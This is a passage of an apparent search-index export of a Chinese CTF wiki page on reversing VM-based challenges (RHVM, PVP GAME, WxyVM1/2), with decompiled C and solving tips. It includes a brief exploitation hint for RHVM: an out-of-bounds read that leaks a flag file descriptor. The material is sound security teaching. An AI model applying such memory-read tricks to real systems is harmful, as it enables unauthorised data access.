\u5230\u8fd9\u91cc\u57fa\u672c\u5df2\u7ecf\u6e05\u695a\u4e86\uff0c\u628a\u6570\u636e\u90fddump\u4e0b\u6765\uff0c\u5199\u4e2a\u811a\u672c\u9006\u4e00\u4e0b\u5c31ok\u4e86\u3002\u7136\u540e\u8fd8\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7684\u8fd0\u7b97\u662f\u4ee5byte\u4e3a\u5355\u4f4d\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u6ea2\u51fa\uff0c\u6240\u4ee5\u5e94\u8be5\u6bcf\u6b21\u64cd\u4f5c\u4e4b\u540e\u6a21\u4e00\u4e0b256\u3002 \u5177\u4f53WP\uff0c \u770b\u8fd9\u91cc \u3002 \u5357\u90aeWxyVM2 \u00b6 \u7a0b\u5e8f\u7684\u57fa\u672c\u60c5\u51b5\u4e0e WxyVM1 \u76f8\u540c\uff0c\u6700\u5927\u7684\u4e0d\u540c\u5c31\u662fVM\u865a\u62df\u5f15\u64ce\u3002\u8fd9\u9053\u9898\u4f7f\u7528\u7684\u662f dword_69417c ~ dword_6941dc \u6570\u7ec4\u7684\u591a\u6b21\u6df7\u5408\u8fd0\u7b97\u3002","title":"VM\u865a\u62df\u673a"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#vm","text":"","title":"VM\u865a\u62df\u673a"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#_1","text":"VM\u5c31\u662f\u865a\u62df\u673a\uff0c\u7c7b\u5c5e\u4e8eVMware\u4e4b\u7c7b\u7684\u3002\u800c\u865a\u62df\u673a\u662f\u5728\u7a0b\u5e8f\u4e2d\u7528\u4ee3\u7801\u6765\u5b9e\u73b0\u7684\u4e00\u4e2a\u865a\u62df\u7cfb\u7edf\uff0c\u7528\u8fd9\u4e2a\u865a\u62df\u7cfb\u7edf\u6765\u89e3\u91ca\u4e00\u4e32**\u5b57\u8282\u7801**\u3002 \u901a\u4fd7\u7684\u6765\u8bf4\uff0cVM\u5c31\u662f\u81ea\u5df1\u8bbe\u8ba1\u4e00\u5957\u7684\u6307\u4ee4\u96c6\u548c\u89e3\u6790\u6307\u4ee4\u96c6\u7684\u89e3\u91ca\u5668\u3002\u518d\u7b80\u5355\u4e00\u70b9\u5c31\u662f\u81ea\u5df1\u5b9e\u73b0\u4e00\u5957\u6c47\u7f16\u8bed\u8a00\u3002 VM\u8bbe\u8ba1\u7684\u4e3b\u8981\u662f\u7684C\u8bed\u8a00\u89e3\u91ca\u5668\uff0c \u624b\u628a\u624b\u6559C\u8bed\u8a00\u7f16\u8bd1\u5668\u865a\u62df\u5668\u8bbe\u8ba1 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5bf9\u6574\u4e2a\u865a\u62df\u89e3\u91ca\u5668\u7ed3\u6784\u8fdb\u884c\u9006\u5411\uff0c\u627e\u51fa\u5176\u4e2d\u5b9a\u4e49\u4e86\u4ec0\u4e48\u51fd\u6570\uff0c\u529f\u80fd\u7b49\u7b49\uff0c\u8fd8\u9700\u8981\u7ed3\u5408\u63d0\u4f9b\u7684\u5b57\u8282\u7801\u8fdb\u884c\u5206\u6790\u3002 \u5b57\u8282\u7801\uff08Byte-code\uff09\u662f\u4e00\u79cd\u5305\u542b\u6267\u884c\u7a0b\u5e8f\uff0c\u7531\u4e00\u5e8f\u5217 op \u4ee3\u7801/\u6570\u636e\u5bf9\u7ec4\u6210\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u662f\u4e00\u79cd\u4e2d\u95f4\u7801\u3002\u88ab\u770b\u4f5c\u662f**\u5305\u542b\u4e00\u4e2a \u6267\u884c\u7a0b\u5e8f \u7684\u4e8c\u8fdb\u5236\u6587\u4ef6**\uff0c\u66f4\u50cf\u4e00\u4e2a\u5bf9\u8c61\u6a21\u578b\u3002\u5b57\u8282\u7801\u88ab\u8fd9\u6837\u53eb\u662f\u56e0\u4e3a\u901a\u5e38\u6bcf\u4e2a opcode \u662f\u4e00\u5b57\u8282\u957f\uff0c\u4f46\u662f\u6307\u4ee4\u7801\u7684\u957f\u5ea6\u662f\u53d8\u5316\u7684\u3002\u6bcf\u4e2a\u6307\u4ee4\u6709\u4ece 0 \u5230 255\uff08\u6216\u5341\u516d\u8fdb\u5236\u7684\uff1a 00 \u5230FF)\u7684\u4e00\u5b57\u8282 \u64cd\u4f5c\u7801 \uff0c\u88ab\u53c2\u6570\u4f8b\u5982\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5730\u5740\u8ddf\u968f\u3002","title":"\u4ecb\u7ecd"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#_2","text":"VM\u7c7b\u9898\u76ee\u73b0\u5728\u4e3b\u6d41\u662fPwn\u9898\uff0c\u4f46\u4e5f\u6709\u5728\u9006\u5411\u7684\u9898\u76ee\uff0c\u5c11\u90e8\u5206\u4e5f\u6709\u5728\u6742\u9879\u3002 \u867d\u7136\u662f\u6709\u51e0\u4e2a\u65b9\u5411\uff0c\u4f46\u662f\u57fa\u672c\u5f52\u7ed3\u8d77\u6765\u662f\u4e24\u7c7b\uff1a \u7ed9\u51fa\u53ef\u6267\u884c\u7a0b\u5e8f\u548c\u5b57\u8282\u7801\uff0c\u9006\u5411\u865a\u62df\u5f15\u64ce\uff08\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u8fdb\u884c\u7684\u64cd\u4f5c\uff09\uff0c\u7ed3\u5408\u9898\u76ee\u63d0\u4f9b\u7684\u5b57\u8282\u7801\uff0c\u63a8\u51fa\u6765flag \u53ea\u7ed9\u51fa\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u9006\u5411\u865a\u62df\u5f15\u64ce\uff08\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u8fdb\u884c\u7684\u64cd\u4f5c\uff09\uff0c\u6784\u9020\u5b57\u8282\u7801\uff0c\u8bfb\u53d6flag","title":"\u9898\u76ee\u7c7b\u578b"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#_3","text":"\u6765\u81ea \u4e00\u7b50\u841d\u535c \u5f53\u5728\u6253CTF\u62ff\u5230\u4e00\u4e2aVM\u9898\u7684\u65f6\u5019\uff0c\u601d\u8def\u4e00\u5b9a\u6e05\u6670\uff0c\u4e0d\u80fd\u76f2\u76ee\u7684\u53bb\u5206\u6790\uff1b \u5206\u6790\u865a\u62df\u673a\u5165\u53e3\uff0c\u627e\u51fa\u6765\u9898\u76ee\u63d0\u4f9b\u7684\u5b57\u8282\u7801 \u7406\u6e05\u865a\u62df\u673a\u7684\u7ed3\u6784\uff0c\u9006\u5411\u5904\u5404\u4e2ahandler\u7684\u610f\u601d \u6839\u636e\u5404\u4e2ahandler\u6765\u5c06\u5b57\u8282\u7801\u8fd8\u539f\u6210\u6c47\u7f16\u4ee3\u7801 \u6839\u636e\u6c47\u7f16\u4ee3\u7801\u63a8\u51faflag \u5982\u679c\u52a8\u6001\u8c03\u8bd5\u5206\u6790\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u5f88\u590d\u6742\uff0c\u8df3\u6765\u8df3\u53bb\u7684\uff0c\u6240\u4ee5\u5efa\u8bae\u5148\u7528IDA\u6765\u9759\u6001\u5206\u6790\u3002","title":"\u505a\u9898\u6280\u5de7"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#_4","text":"","title":"\ud83c\udf30\u4f8b\u5b50"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#rhvm","text":"\u521d\u59cb\u5316\u51fd\u6570\u6253\u5f00\u4e86 flag \u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 dup2 \u5c06 \u6587\u4ef6\u63cf\u8ff0\u7b26 \u91cd\u5b9a\u5411\u5230 563 \u3002 fd = open ( \"/flag\" , 0 ); if ( fd == -1 ) { puts ( \"What?\" ); exit ( -1 ); } dup2 ( fd , 563 ); \u5728\u6267\u884c\u5b8c main \u51fd\u6570\u540e\u4f1a\u8df3\u8f6c\u5230\u8fd9\u91cc\u3002\u5982\u679c\u5c06stdin\u7684fileno\u4fee\u6539\u4e3a563\uff0c\u90a3\u4e48\u8fd9\u91ccscanf\u4f1a\u8bfb\u53d6\u5230flag\uff0c\u7136\u540e\u5728\u4e0b\u4e00\u884c\u7684printf\u8f93\u51faflag\u3002 printf ( \"Could you tell me your name?\" ); __isoc99_scanf ( \"%99s\" , & v0 ); printf ( \"Goodbye~ %s \\n \" , & v0 ); puts ( \"See you next time.\" ); exit ( 0 ); \u627e\u5230VM\u5b9a\u4e49\u7684\u5165\u53e3\uff0c\u9006\u5411\u51fa\u865a\u62df\u5f15\u64ce\u3002\u627e\u5230\u5f15\u64ce\u4e2d\u5b9a\u4e49\u7684 MovDataToReg \u548c MovRegToData \u53ef\u4ee5\u8d8a\u754c\u8bfb\u53d6Data\u6bb5\u3002 \u5177\u4f53WP\uff0c \u770b\u8fd9\u91cc \u3002","title":"\u7ea2\u5e3d\u676fRHVM"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#pvp-game","text":"\u7a0b\u5e8f\u8bfb\u53d6\u8f93\u5165\u540e\uff0c\u5bf9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884cbase64\u89e3\u7801 _BYTE * __fastcall Base64Decode ( const char * src ) { int v2 ; // [rsp+10h] [rbp-220h] int v3 ; // [rsp+14h] [rbp-21Ch] signed __int64 OrignLen ; // [rsp+18h] [rbp-218h] signed __int64 len ; // [rsp+20h] [rbp-210h] _BYTE * dest ; // [rsp+28h] [rbp-208h] int v7 [ 126 ]; // [rsp+30h] [rbp-200h] unsigned __int64 v8 ; // [rsp+228h] [rbp-8h] qmemcpy ( v7 , & unk_1B60 , 0x1ECuLL ); len = strlen ( src ); if ( strstr ( src , \"==\" ) ) // base64 { OrignLen = 3 * ( len / 4 ) - 2 ; } else if ( strchr ( src , '=' ) ) { OrignLen = 3 * ( len / 4 ) - 1 ; } else { OrignLen = 3 * ( len / 4 ); } dest = calloc ( 1uLL , OrignLen + 1 ); dest [ OrignLen ] = 0 ; v2 = 0 ; v3 = 0 ; while ( v2 < len - 2 ) { dest [ v3 ] = (( unsigned __int8 ) v7 [( unsigned __int8 ) src [ v2 + 1 ]] >> 4 ) | 4 * v7 [( unsigned __int8 ) src [ v2 ]]; dest [ v3 + 1 ] = (( unsigned __int8 ) v7 [( unsigned __int8 ) src [ v2 + 2 ]] >> 2 ) | 16 * v7 [( unsigned __int8 ) src [ v2 + 1 ]]; dest [ v3 + 2 ] = LOBYTE ( v7 [( unsigned __int8 ) src [ v2 + 3 ]]) | (( unsigned __int8 ) v7 [( unsigned __int8 ) src [ v2 + 2 ]] << 6 ); v3 += 3 ; v2 += 4 ; } return dest ; } \u7136\u540e\u8fd0\u884cdefence\u6587\u4ef6\u63d0\u4f9b\u7684\u5b57\u8282\u7801\u6765\u5bf9\u8f93\u5165\u7684code\u8fdb\u884c\u68c0\u67e5\u3002\u6700\u540e\u8fd0\u884c\u8f93\u5165\u7684\u5b57\u8282\u7801\u3002 for ( j = 0 ; j <= 15 ; ++ j ) RunOpcode ( Defence , a2 , 24L L * j , a4 , a5 , a6 , Code [ j ]. opcode , Code [ j ]. arg1 , Code [ j ]. arg2 ); return puts ( \"Game Over!\" ); \u8f93\u5165\u7684\u5b57\u8282\u7801\u662f\u538b\u5165\u6570\u636e\u548c\u6267\u884c\u51fd\u6570\u3002\u56e0\u4e3a\u7a0b\u5e8f\u5f00\u59cb\u5c31\u7ed9\u51fa\u4e86 libc \u7684\u5730\u5740\uff0c\u6240\u4ee5\u5c31\u89e3\u9898\u7684\u5173\u952e\u5c31\u662f\u9006\u5411\u51fa\u865a\u62df\u5f15\u64ce\u7684\u5185\u5bb9\u3002 \u5177\u4f53WP\uff0c \u770b\u8fd9\u91cc \u3002","title":"\u7ea2\u5e3d\u676fPVP GAME"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#wxyvm1","text":"\u4ece main \u51fd\u6570\u770b\uff0c\u5c31\u662f\u5c06 input \u52a0\u5bc6\u540e\u4e0e \u771f\u00b7flag \u7684\u52a0\u5bc6\u503c\u5bf9\u6bd4\uff0c\u76f8\u540c\u7684\u8f93\u51fa correct \u3002 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { char v4 ; // [rsp+Bh] [rbp-5h] signed int i ; // [rsp+Ch] [rbp-4h] puts ( \"[WxyVM 0.0.1]\" ); puts ( \"input your flag:\" ); scanf ( \"%s\" , & input ); v4 = 1 ; vm_start (); //input\u52a0\u5bc6\u51fd\u6570 if ( strlen ( & input ) != 24 ) v4 = 0 ; for ( i = 0 ; i <= 23 ; ++ i ) { if ( * ( & input + i ) != enc [ i ] ) v4 = 0 ; } if ( v4 ) puts ( \"correct\" ); else puts ( \"wrong\" ); return 0L L ; } \u4e5f\u5c31\u662f\u8bf4\u5c06 vm_start \u7684\u52a0\u5bc6\u539f\u7406\u641e\u51fa\u6765\u5c31\u597d\u4e86\u3002\u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 byte_6010C0 \u8fd9\u4e2a\u6570\u7ec4\u768415000\u4e2a\u5143\u7d20\uff0c\u5176\u4e2d\u6bcf\u4e09\u4e2a\u4e3a\u4e00\u7ec4\u53c2\u52a0\u4e00\u6b21\u5faa\u73af\u3002byte_6010C0[i] \u4f5c\u4e3a switch \u7684\u64cd\u4f5c\u6307\u4ee4\uff0cbyte_6010C0[i + 1] \u4f5c\u4e3a input \u7684\u4e0b\u6807\uff0cbyte_6010C0[i + 2] \u4f5c\u4e3a\u8fdb\u884c\u64cd\u4f5c\u7684\u64cd\u4f5c\u6570\u3002 __int64 vm_start () { unsigned int v0 ; // ST04_4 __int64 result ; // rax signed int i ; // [rsp+0h] [rbp-10h] char v3 ; // [rsp+8h] [rbp-8h] for ( i = 0 ; i <= 14999 ; i += 3 ) { v0 = byte_6010C0 [ i ]; v3 = byte_6010C0 [ i + 2 ]; result = v0 ; switch ( v0 ) { case 1u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) += v3 ; break ; case 2u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) -= v3 ; break ; case 3u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) ^= v3 ; break ; case 4u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) *= v3 ; break ; case 5u : result = byte_6010C0 [ i + 1 ]; * ( & input + result ) ^= * ( & input + byte_6010C0 [ i + 2 ]); break ; default : continue ; } } return result ; } \u5230\u8fd9\u91cc\u57fa\u672c\u5df2\u7ecf\u6e05\u695a\u4e86\uff0c\u628a\u6570\u636e\u90fddump\u4e0b\u6765\uff0c\u5199\u4e2a\u811a\u672c\u9006\u4e00\u4e0b\u5c31ok\u4e86\u3002\u7136\u540e\u8fd8\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7684\u8fd0\u7b97\u662f\u4ee5byte\u4e3a\u5355\u4f4d\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u6ea2\u51fa\uff0c\u6240\u4ee5\u5e94\u8be5\u6bcf\u6b21\u64cd\u4f5c\u4e4b\u540e\u6a21\u4e00\u4e0b256\u3002 \u5177\u4f53WP\uff0c \u770b\u8fd9\u91cc \u3002","title":"\u5357\u90aeWxyVM1"},{"location":"Re/VM%E9%80%86%E5%90%91%E4%BE%8B%E9%A2%98--%E5%8D%97%E9%82%AE%E5%B9%B3%E5%8F%B0/VM/#wxyvm2","text":"\u7a0b\u5e8f\u7684\u57fa\u672c\u60c5\u51b5\u4e0e WxyVM1 \u76f8\u540c\uff0c\u6700\u5927\u7684\u4e0d\u540c\u5c31\u662fVM\u865a\u62df\u5f15\u64ce\u3002\u8fd9\u9053\u9898\u4f7f\u7528\u7684\u662f dword_69417c ~ dword_6941dc \u6570\u7ec4\u7684\u591a\u6b21\u6df7\u5408\u8fd0\u7b97\u3002","title":"\u5357\u90aeWxyVM2"}]}